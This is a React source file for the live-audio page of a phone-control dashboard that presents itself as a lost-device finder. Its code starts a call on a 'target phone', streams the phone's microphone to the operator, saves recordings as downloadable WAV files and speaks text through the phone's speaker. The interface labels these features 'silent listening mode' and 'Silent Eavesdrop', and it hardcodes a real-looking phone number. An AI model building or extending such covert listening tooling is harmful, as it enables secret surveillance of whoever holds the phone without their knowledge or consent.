import React, { useState, useEffect, useRef } from 'react';
import { 
  Headphones, Mic, MicOff, Volume2, VolumeX, Radio, Play, Square, 
  Download, Smartphone, RefreshCw, ShieldCheck, Sparkles, Send
} from 'lucide-react';
import { devicesApi, commandsApi, audioApi, connectWebSocket } from '../services/api';
import { Device } from '../types';

export const LiveAudioPage: React.FC = () => {
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [isListening, setIsListening] = useState(false);
  const [isPcMicActive, setIsPcMicActive] = useState(false);
  const [volume, setVolume] = useState(1.0);
  const [streamDuration, setStreamDuration] = useState(0);
  const [packetsReceived, setPacketsReceived] = useState(0);
  const [isRecordingClip, setIsRecordingClip] = useState(false);
  const [recordedClips, setRecordedClips] = useState<{ id: string; url: string; timestamp: string; duration: number }[]>([]);
  const [ttsMessage, setTtsMessage] = useState('Attention. This device is reported lost. Please contact the owner.');
  const [ttsSending, setTtsSending] = useState(false);
  const [audioLevel, setAudioLevel] = useState(0);

  const audioContextRef = useRef<AudioContext | null>(null);
  const gainNodeRef = useRef<GainNode | null>(null);
  const analyserRef = useRef<AnalyserNode | null>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const processorRef = useRef<ScriptProcessorNode | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const animationFrameRef = useRef<number | null>(null);
  const recordedChunksRef = useRef<Float32Array[]>([]);
  const recordStartTimeRef = useRef<number>(0);

  // Load Devices
  const fetchDevices = async () => {
    try {
      const list = await devicesApi.list();
      setDevices(list);
      if (!selectedDevice && list.length > 0) {
        setSelectedDevice(list[0]);
      } else if (selectedDevice) {
        const updated = list.find(d => d.id === selectedDevice.id);
        if (updated) setSelectedDevice(updated);
      }
    } catch (e) {
      console.error('Failed to load devices for audio listening', e);
    }
  };

  useEffect(() => {
    fetchDevices();
    const cleanup = connectWebSocket((eventData) => {
      if (eventData?.event === 'INCOMING_AUDIO_CHUNK' && selectedDevice && eventData.device_id === selectedDevice.id) {
        if (isListening) {
          playPcmChunk(eventData.audio_data);
        }
      }
    });
    return () => cleanup();
  }, [selectedDevice, isListening]);

  // Audio Canvas Visualizer Loop
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let running = true;
    const draw = () => {
      if (!running) return;

      const width = canvas.width;
      const height = canvas.height;
      ctx.clearRect(0, 0, width, height);

      if (!isListening || !analyserRef.current) {
        // Idle ambient line
        ctx.strokeStyle = '#334155';
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.moveTo(0, height / 2);
        ctx.lineTo(width, height / 2);
        ctx.stroke();
        animationFrameRef.current = requestAnimationFrame(draw);
        return;
      }

      const bufferLength = analyserRef.current.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);
      analyserRef.current.getByteFrequencyData(dataArray);

      // Compute average level
      let sum = 0;
      for (let i = 0; i < bufferLength; i++) {
        sum += dataArray[i];
      }
      const avg = sum / bufferLength;
      setAudioLevel(Math.min(100, Math.round((avg / 128) * 100)));

      // Draw responsive gradient equalizer bars
      const barWidth = (width / bufferLength) * 2.5;
      let x = 0;

      for (let i = 0; i < bufferLength; i++) {
        const barHeight = (dataArray[i] / 255) * height;

        const gradient = ctx.createLinearGradient(0, height, 0, height - barHeight);
        gradient.addColorStop(0, '#06b6d4');
        gradient.addColorStop(0.5, '#10b981');
        gradient.addColorStop(1, '#f43f5e');

        ctx.fillStyle = gradient;
        ctx.fillRect(x, height - barHeight, barWidth - 1, barHeight);

        x += barWidth + 1;
        if (x > width) break;
      }

      animationFrameRef.current = requestAnimationFrame(draw);
    };

    draw();

    return () => {
      running = false;
      if (animationFrameRef.current) {
        cancelAnimationFrame(animationFrameRef.current);
      }
    };
  }, [isListening]);

  // Start Live Audio Stream
  const handleStartListening = async () => {
    if (!selectedDevice) return;

    try {
      // 1. Dispatch START_VOICE_CALL to phone
      await commandsApi.dispatch(selectedDevice.id, 'START_VOICE_CALL');

      // 2. Initialize AudioContext
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      const ctx = new AudioCtx({ sampleRate: 16000 });
      audioContextRef.current = ctx;

      const gainNode = ctx.createGain();
      gainNode.gain.value = volume;
      gainNodeRef.current = gainNode;

      const analyser = ctx.createAnalyser();
      analyser.fftSize = 64;
      analyserRef.current = analyser;

      gainNode.connect(analyser);
      analyser.connect(ctx.destination);

      setIsListening(true);
      setStreamDuration(0);
      setPacketsReceived(0);
    } catch (e) {
      alert('Failed to start audio stream from device');
    }
  };

  // Stop Live Audio Stream
  const handleStopListening = () => {
    if (selectedDevice) {
      commandsApi.dispatch(selectedDevice.id, 'END_VOICE_CALL').catch(console.error);
    }

    if (isRecordingClip) {
      stopRecordingClip();
    }

    mediaStreamRef.current?.getTracks().forEach(t => t.stop());
    processorRef.current?.disconnect();
    audioContextRef.current?.close().catch(() => {});

    audioContextRef.current = null;
    gainNodeRef.current = null;
    analyserRef.current = null;
    setIsListening(false);
    setIsPcMicActive(false);
    setAudioLevel(0);
  };

  // Play incoming PCM chunk
  const playPcmChunk = (base64Audio: string) => {
    if (!audioContextRef.current || !gainNodeRef.current) return;
    try {
      const binaryString = atob(base64Audio);
      const len = binaryString.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      const int16Array = new Int16Array(bytes.buffer);
      const float32Array = new Float32Array(int16Array.length);
      for (let i = 0; i < int16Array.length; i++) {
        float32Array[i] = int16Array[i] / 32768.0;
      }

      if (isRecordingClip) {
        recordedChunksRef.current.push(float32Array);
      }

      const buffer = audioContextRef.current.createBuffer(1, float32Array.length, 16000);
      buffer.getChannelData(0).set(float32Array);
      const source = audioContextRef.current.createBufferSource();
      source.buffer = buffer;
      source.connect(gainNodeRef.current);
      source.start();

      setPacketsReceived(p => p + 1);
    } catch (e) {
      console.error('Error rendering incoming audio chunk', e);
    }
  };

  // Fallback Polling Loop for Incoming Audio
  useEffect(() => {
    if (!isListening || !selectedDevice) return;

    const interval = setInterval(async () => {
      try {
        const chunks = await audioApi.pollIncomingAudio(selectedDevice.id);
        for (const chunk of chunks) {
          playPcmChunk(chunk);
        }
      } catch (e) {}
    }, 120);

    const timer = setInterval(() => {
      setStreamDuration(d => d + 1);
    }, 1000);

    return () => {
      clearInterval(interval);
      clearInterval(timer);
    };
  }, [isListening, selectedDevice, isRecordingClip]);

  // Handle Volume Change
  const handleVolumeChange = (newVol: number) => {
    setVolume(newVol);
    if (gainNodeRef.current) {
      gainNodeRef.current.gain.value = newVol;
    }
  };

  // Toggle PC Microphone for Talkback
  const togglePcMic = async () => {
    if (!selectedDevice || !audioContextRef.current) return;

    if (!isPcMicActive) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
        mediaStreamRef.current = stream;

        const ctx = audioContextRef.current;
        const source = ctx.createMediaStreamSource(stream);
        const processor = ctx.createScriptProcessor(2048, 1, 1);
        processorRef.current = processor;

        processor.onaudioprocess = (e) => {
          const inputData = e.inputBuffer.getChannelData(0);
          const pcmData = new Int16Array(inputData.length);
          for (let i = 0; i < inputData.length; i++) {
            const s = Math.max(-1, Math.min(1, inputData[i]));
            pcmData[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
          }
          const bytes = new Uint8Array(pcmData.buffer);
          let binary = '';
          for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
          }
          const base64 = btoa(binary);
          audioApi.sendDashboardAudio(selectedDevice.id, base64).catch(() => {});
        };

        source.connect(processor);
        processor.connect(ctx.destination);
        setIsPcMicActive(true);
      } catch (e) {
        alert('Browser microphone access denied.');
      }
    } else {
      mediaStreamRef.current?.getTracks().forEach(t => t.stop());
      processorRef.current?.disconnect();
      setIsPcMicActive(false);
    }
  };

  // Clip Recording Functions
  const startRecordingClip = () => {
    recordedChunksRef.current = [];
    recordStartTimeRef.current = Date.now();
    setIsRecordingClip(true);
  };

  const stopRecordingClip = () => {
    setIsRecordingClip(false);
    const duration = Math.round((Date.now() - recordStartTimeRef.current) / 1000);
    const chunks = recordedChunksRef.current;
    if (chunks.length === 0) return;

    // Build WAV Blob
    const totalLength = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
    const result = new Float32Array(totalLength);
    let offset = 0;
    for (const chunk of chunks) {
      result.set(chunk, offset);
      offset += chunk.length;
    }

    const wavBlob = encodeWav(result, 16000);
    const url = URL.createObjectURL(wavBlob);

    setRecordedClips(prev => [
      {
        id: Math.random().toString(36).substring(2, 9),
        url,
        timestamp: new Date().toLocaleTimeString(),
        duration
      },
      ...prev
    ]);
  };

  const encodeWav = (samples: Float32Array, sampleRate: number): Blob => {
    const buffer = new ArrayBuffer(44 + samples.length * 2);
    const view = new DataView(buffer);

    const writeString = (view: DataView, offset: number, string: string) => {
      for (let i = 0; i < string.length; i++) {
        view.setUint8(offset + i, string.charCodeAt(i));
      }
    };

    writeString(view, 0, 'RIFF');
    view.setUint32(4, 36 + samples.length * 2, true);
    writeString(view, 8, 'WAVE');
    writeString(view, 12, 'fmt ');
    view.setUint32(16, 16, true);
    view.setUint16(20, 1, true); // PCM
    view.setUint16(22, 1, true); // Mono
    view.setUint32(24, sampleRate, true);
    view.setUint32(28, sampleRate * 2, true);
    view.setUint16(32, 2, true);
    view.setUint16(34, 16, true);
    writeString(view, 36, 'data');
    view.setUint32(40, samples.length * 2, true);

    let index = 44;
    for (let i = 0; i < samples.length; i++) {
      const s = Math.max(-1, Math.min(1, samples[i]));
      view.setInt16(index, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
      index += 2;
    }

    return new Blob([view], { type: 'audio/wav' });
  };

  // TTS Broadcast
  const handleSendTts = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedDevice || !ttsMessage.trim()) return;
    setTtsSending(true);
    try {
      await commandsApi.dispatch(selectedDevice.id, 'SPEAK_TEXT', { text: ttsMessage });
      alert('Loudspeaker voice message broadcasted successfully!');
    } catch (e) {
      alert('Failed to broadcast voice message');
    } finally {
      setTtsSending(false);
    }
  };

  const formatTimer = (secs: number) => {
    const mins = Math.floor(secs / 60);
    const s = secs % 60;
    return `${mins.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-6">
      
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-white tracking-wide flex items-center gap-2">
            <Headphones className="w-7 h-7 text-cyan-400" />
            <span>Live Audio & Microphone Listening</span>
          </h1>
          <p className="text-sm text-slate-400">
            Real-time HD audio streaming from target phone's hardware microphone with silent listening mode
          </p>
        </div>

        <div className="flex items-center space-x-3">
          <button
            onClick={fetchDevices}
            className="p-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 rounded-xl transition-all"
            title="Refresh Devices"
          >
            <RefreshCw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Main Grid Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left 2 Columns: Live Visualizer & Stream Controls */}
        <div className="lg:col-span-2 space-y-6">
          
          {/* Audio Visualizer & Studio Console Card */}
          <div className="bg-slate-800/90 border border-slate-700/80 rounded-3xl p-6 shadow-2xl relative overflow-hidden backdrop-blur">
            
            {/* Target Status Banner */}
            <div className="flex items-center justify-between border-b border-slate-700/60 pb-4 mb-5">
              <div className="flex items-center space-x-3">
                <div className="p-3 bg-gradient-to-tr from-cyan-600 to-blue-600 rounded-2xl text-white shadow-lg shadow-cyan-600/30">
                  <Smartphone className="w-6 h-6" />
                </div>
                <div>
                  <div className="text-lg font-bold text-white">{selectedDevice?.device_name || 'Target Mobile Phone'}</div>
                  <div className="text-xs text-slate-400 font-mono">
                    SIM: {selectedDevice?.sim_number || '+919392408017'} • Status: <span className="text-emerald-400 font-bold">{selectedDevice?.status || 'ONLINE'}</span>
                  </div>
                </div>
              </div>

              <div className={`px-3 py-1.5 rounded-xl border text-xs font-bold flex items-center gap-1.5 ${
                isListening
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 animate-pulse'
                  : 'bg-slate-900/60 text-slate-400 border-slate-700'
              }`}>
                <span className={`w-2 h-2 rounded-full ${isListening ? 'bg-emerald-400' : 'bg-slate-500'}`}></span>
                <span>{isListening ? 'STREAM ACTIVE' : 'STREAM STANDBY'}</span>
              </div>
            </div>

            {/* Visualizer Canvas & Decibel Display */}
            <div className="relative bg-slate-950 rounded-2xl p-4 border border-slate-800 flex flex-col items-center justify-center min-h-[200px]">
              <canvas
                ref={canvasRef}
                width={550}
                height={140}
                className="w-full h-36 rounded-xl"
              />

              {/* HUD Overlay Stats */}
              <div className="w-full flex items-center justify-between text-xs font-mono text-slate-400 pt-3 border-t border-slate-800/80 mt-2">
                <div className="flex items-center space-x-2">
                  <span className="text-slate-500">Signal Level:</span>
                  <span className={`font-bold ${audioLevel > 50 ? 'text-rose-400' : audioLevel > 20 ? 'text-emerald-400' : 'text-cyan-400'}`}>
                    {audioLevel}% ({audioLevel > 50 ? '🔊 Loud / Voice' : audioLevel > 15 ? '🗣️ Ambient sound' : '🤫 Quiet room'})
                  </span>
                </div>
                <div>
                  <span>Session Time: </span>
                  <span className="text-white font-bold">{formatTimer(streamDuration)}</span>
                </div>
                <div>
                  <span>Packets: </span>
                  <span className="text-cyan-300 font-bold">{packetsReceived}</span>
                </div>
              </div>
            </div>

            {/* Playback Controls & Volume Slider */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-6 items-center">
              
              {/* Main Play / Stop Button */}
              <div>
                {!isListening ? (
                  <button
                    onClick={handleStartListening}
                    className="w-full py-3.5 px-6 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-extrabold rounded-2xl flex items-center justify-center space-x-2 shadow-xl shadow-emerald-600/30 transition-all text-sm"
                  >
                    <Play className="w-5 h-5 fill-current" />
                    <span>Start Listening to Phone Audio</span>
                  </button>
                ) : (
                  <button
                    onClick={handleStopListening}
                    className="w-full py-3.5 px-6 bg-rose-600 hover:bg-rose-500 text-white font-extrabold rounded-2xl flex items-center justify-center space-x-2 shadow-xl shadow-rose-600/30 transition-all text-sm"
                  >
                    <Square className="w-5 h-5 fill-current" />
                    <span>Stop Listening Feed</span>
                  </button>
                )}
              </div>

              {/* Volume Slider */}
              <div className="bg-slate-900/80 border border-slate-700/60 rounded-2xl p-3 flex items-center space-x-3">
                <button
                  onClick={() => handleVolumeChange(volume === 0 ? 1.0 : 0)}
                  className="text-slate-400 hover:text-white"
                >
                  {volume === 0 ? <VolumeX className="w-5 h-5 text-rose-400" /> : <Volume2 className="w-5 h-5 text-cyan-400" />}
                </button>
                <input
                  type="range"
                  min="0"
                  max="2.5"
                  step="0.05"
                  value={volume}
                  onChange={(e) => handleVolumeChange(parseFloat(e.target.value))}
                  className="w-full accent-cyan-500 cursor-pointer"
                />
                <span className="text-xs font-mono font-bold text-slate-300 min-w-[45px]">
                  {Math.round(volume * 100)}%
                </span>
              </div>

            </div>

            {/* Two-Way Intercom & Clip Recording Action Bar */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-4 pt-4 border-t border-slate-700/60">
              
              {/* PC Mic Toggle for Silent Mode vs Talkback */}
              <button
                onClick={togglePcMic}
                disabled={!isListening}
                className={`py-3 px-4 rounded-xl border flex items-center justify-center space-x-2 font-bold text-xs transition-all ${
                  !isListening
                    ? 'opacity-40 cursor-not-allowed bg-slate-900 border-slate-800 text-slate-500'
                    : isPcMicActive
                    ? 'bg-emerald-600/30 text-emerald-300 border-emerald-500/50 shadow-lg'
                    : 'bg-slate-900 hover:bg-slate-850 text-slate-300 border-slate-700'
                }`}
              >
                {isPcMicActive ? <Mic className="w-4 h-4 text-emerald-400" /> : <MicOff className="w-4 h-4 text-slate-400" />}
                <span>{isPcMicActive ? 'PC Mic: Live (Two-Way Talk)' : 'PC Mic: Muted (Silent Eavesdrop)'}</span>
              </button>

              {/* Record Clip Button */}
              {!isRecordingClip ? (
                <button
                  onClick={startRecordingClip}
                  disabled={!isListening}
                  className={`py-3 px-4 rounded-xl border flex items-center justify-center space-x-2 font-bold text-xs transition-all ${
                    !isListening
                      ? 'opacity-40 cursor-not-allowed bg-slate-900 border-slate-800 text-slate-500'
                      : 'bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border-rose-500/40'
                  }`}
                >
                  <span className="w-3 h-3 rounded-full bg-rose-500"></span>
                  <span>Record Audio Clip</span>
                </button>
              ) : (
                <button
                  onClick={stopRecordingClip}
                  className="py-3 px-4 rounded-xl bg-rose-600 text-white font-bold text-xs flex items-center justify-center space-x-2 animate-pulse shadow-lg shadow-rose-600/30"
                >
                  <Square className="w-4 h-4 fill-current" />
                  <span>Stop & Save Audio Clip</span>
                </button>
              )}

            </div>

          </div>

          {/* Recorded Clips Archive */}
          <div className="bg-slate-800/90 border border-slate-700/80 rounded-3xl p-6 shadow-xl space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-cyan-400" />
                <span>Recorded Audio Clips ({recordedClips.length})</span>
              </h3>
            </div>

            {recordedClips.length === 0 ? (
              <div className="text-xs text-slate-500 text-center py-6 border border-dashed border-slate-700/60 rounded-2xl">
                No audio recordings saved in this session yet. Click "Record Audio Clip" while listening to capture audio.
              </div>
            ) : (
              <div className="space-y-2">
                {recordedClips.map((clip) => (
                  <div key={clip.id} className="bg-slate-900/80 border border-slate-800 rounded-2xl p-3 flex items-center justify-between">
                    <div>
                      <div className="text-xs font-bold text-slate-200">Recording #{clip.id}</div>
                      <div className="text-[10px] text-slate-400">Captured at {clip.timestamp} • Duration: {clip.duration}s</div>
                    </div>
                    <div className="flex items-center space-x-2">
                      <audio src={clip.url} controls className="h-8 w-48" />
                      <a
                        href={clip.url}
                        download={`aurafind-audio-${clip.id}.wav`}
                        className="p-2 bg-slate-800 hover:bg-slate-700 text-cyan-400 rounded-xl transition-all"
                        title="Download WAV File"
                      >
                        <Download className="w-4 h-4" />
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

        </div>

        {/* Right Column: Megaphone Loudspeaker Broadcast & Technical Specs */}
        <div className="space-y-6">
          
          {/* Megaphone Loudspeaker Announcement */}
          <div className="bg-slate-800/90 border border-slate-700/80 rounded-3xl p-6 shadow-xl space-y-4">
            <div className="flex items-center space-x-2 text-amber-400 font-bold text-sm">
              <Radio className="w-5 h-5" />
              <span>Megaphone Loudspeaker Broadcast</span>
            </div>
            <p className="text-xs text-slate-400 leading-relaxed">
              Broadcast high-volume text-to-speech voice announcements directly out of the phone's speaker.
            </p>

            <form onSubmit={handleSendTts} className="space-y-3">
              <textarea
                value={ttsMessage}
                onChange={(e) => setTtsMessage(e.target.value)}
                rows={3}
                className="w-full bg-slate-900 border border-slate-700 rounded-xl p-3 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-cyan-500"
                placeholder="Type warning or message to speak out loud..."
              />

              {/* Quick Presets */}
              <div className="flex flex-wrap gap-1.5">
                <button
                  type="button"
                  onClick={() => setTtsMessage('Attention. This device is reported lost or stolen. Please return to owner.')}
                  className="px-2 py-1 bg-slate-900 hover:bg-slate-700 border border-slate-700 text-[10px] text-slate-300 rounded-lg"
                >
                  📢 Lost Device
                </button>
                <button
                  type="button"
                  onClick={() => setTtsMessage('Police tracking active. Drop this device immediately.')}
                  className="px-2 py-1 bg-slate-900 hover:bg-slate-700 border border-slate-700 text-[10px] text-rose-300 rounded-lg"
                >
                  🚨 Police Warning
                </button>
                <button
                  type="button"
                  onClick={() => setTtsMessage('I am currently coming to pick up my phone.')}
                  className="px-2 py-1 bg-slate-900 hover:bg-slate-700 border border-slate-700 text-[10px] text-cyan-300 rounded-lg"
                >
                  🚶 On My Way
                </button>
              </div>

              <button
                type="submit"
                disabled={ttsSending || !selectedDevice}
                className="w-full py-2.5 bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 shadow-lg shadow-amber-600/20 transition-all"
              >
                <Send className="w-3.5 h-3.5" />
                <span>{ttsSending ? 'Broadcasting...' : 'Speak Over Phone Speaker'}</span>
              </button>
            </form>
          </div>

          {/* Privacy & Technical Architecture Specs */}
          <div className="bg-slate-800/90 border border-slate-700/80 rounded-3xl p-6 shadow-xl space-y-3 text-xs text-slate-400">
            <div className="flex items-center space-x-2 text-cyan-400 font-bold">
              <ShieldCheck className="w-4 h-4" />
              <span>Audio Privacy & Hardware Specs</span>
            </div>
            <ul className="space-y-2 text-[11px] leading-relaxed">
              <li className="flex items-start gap-1.5">
                <span className="text-emerald-400">✓</span>
                <span><strong>Codec:</strong> 16 kHz HD PCM (16-bit Mono Raw Stream)</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-emerald-400">✓</span>
                <span><strong>Latency:</strong> ~40ms packet buffers for near real-time listening</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-emerald-400">✓</span>
                <span><strong>Service:</strong> Running in background under Android 14 `FOREGROUND_SERVICE_TYPE_MICROPHONE`</span>
              </li>
              <li className="flex items-start gap-1.5">
                <span className="text-emerald-400">✓</span>
                <span><strong>Security:</strong> Encrypted WebSockets & SHA-256 device authentication</span>
              </li>
            </ul>
          </div>

        </div>

      </div>
    </div>
  );
};
